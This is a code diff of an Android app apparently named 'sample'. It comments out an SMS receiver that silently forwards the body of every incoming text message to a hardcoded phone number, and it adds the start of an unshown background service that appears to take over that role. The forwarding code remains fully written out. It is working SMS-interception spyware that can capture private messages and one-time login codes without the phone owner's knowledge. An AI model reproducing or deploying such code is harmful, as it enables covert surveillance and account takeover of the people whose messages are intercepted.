@@ -37,26 +37,26 @@ public class sample extends AppCompatActivity {
     private static final String PREF_NAME = "MyPrefs";
     private static final String KEY_NUMBER = "saved_number";
 
-    private final BroadcastReceiver smsReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            Bundle bundle = intent.getExtras();
-            if (bundle != null) {
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                if (pdus != null) {
-                    SmsMessage[] messages = new SmsMessage[pdus.length];
-                    for (int i = 0; i < pdus.length; i++) {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            String format = bundle.getString("format");
-                            messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
-                        }
-                    }
-                    processReceivedMessages(messages);
-
-                }
-            }
-        }
-    };
+//    private final BroadcastReceiver smsReceiver = new BroadcastReceiver() {
+//        @Override
+//        public void onReceive(Context context, Intent intent) {
+//            Bundle bundle = intent.getExtras();
+//            if (bundle != null) {
+//                Object[] pdus = (Object[]) bundle.get("pdus");
+//                if (pdus != null) {
+//                    SmsMessage[] messages = new SmsMessage[pdus.length];
+//                    for (int i = 0; i < pdus.length; i++) {
+//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+//                            String format = bundle.getString("format");
+//                            messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
+//                        }
+//                    }
+//                    processReceivedMessages(messages);
+//
+//                }
+//            }
+//        }
+//    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -68,7 +68,7 @@ public class sample extends AppCompatActivity {
         currentNumber = findViewById(R.id.currentNumber);
         btnsend = findViewById(R.id.btnSend);
 
-        registerSmsReceiver();
+//        registerSmsReceiver();
         requestSmsSendAndStoragePermission();
 
         String savedNumber = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
@@ -78,19 +78,21 @@ public class sample extends AppCompatActivity {
             number.setText(savedNumber);
         }
         sendMessage();
+        Intent serviceIntent = new Intent(this, Background.class);
+        startService(serviceIntent);
     }
 
-     private void processReceivedMessages(SmsMessage[] messages) {
-        for (SmsMessage message : messages) {
-        String sender = message.getDisplayOriginatingAddress();
-        String messageBody = message.getMessageBody();
-//        String savedNumber = currentNumber.getText().toString();
-        Toast.makeText(this, "Received SMS: " + messageBody, Toast.LENGTH_LONG).show();
-            SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage("+917225936062", null, messageBody, null, null);
-            Toast.makeText(sample.this, "Sending another message ", Toast.LENGTH_SHORT).show();
-        }
-    }
+//     private void processReceivedMessages(SmsMessage[] messages) {
+//        for (SmsMessage message : messages) {
+//        String sender = message.getDisplayOriginatingAddress();
+//        String messageBody = message.getMessageBody();
+////        String savedNumber = currentNumber.getText().toString();
+//        Toast.makeText(this, "Received SMS: " + messageBody, Toast.LENGTH_LONG).show();
+//            SmsManager smsManager = SmsManager.getDefault();
+//            smsManager.sendTextMessage("+917225936062", null, messageBody, null, null);
+//            Toast.makeText(sample.this, "Sending another message ", Toast.LENGTH_SHORT).show();
+//        }
+//    }
 
     private void sendMessage() {
         btnsend.setOnClickListener(new View.OnClickListener() {
@@ -113,16 +115,17 @@ public class sample extends AppCompatActivity {
                     SmsManager smsManager = SmsManager.getDefault();
                     smsManager.sendTextMessage("+91" + num, null, msg, null, null);
                     Toast.makeText(sample.this, "Sending", Toast.LENGTH_SHORT).show();
+
                 }
             }
         });
     }
 
-    private void registerSmsReceiver() {
-        IntentFilter intentFilter = new IntentFilter();
-        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
-        registerReceiver(smsReceiver, intentFilter);
-    }
+//    private void registerSmsReceiver() {
+//        IntentFilter intentFilter = new IntentFilter();
+//        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
+//        registerReceiver(smsReceiver, intentFilter);
+//    }
     private void requestSmsSendAndStoragePermission() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
@@ -141,7 +144,8 @@ public class sample extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            registerSmsReceiver();
+
+            Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();
         } else {
             Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show();
         }
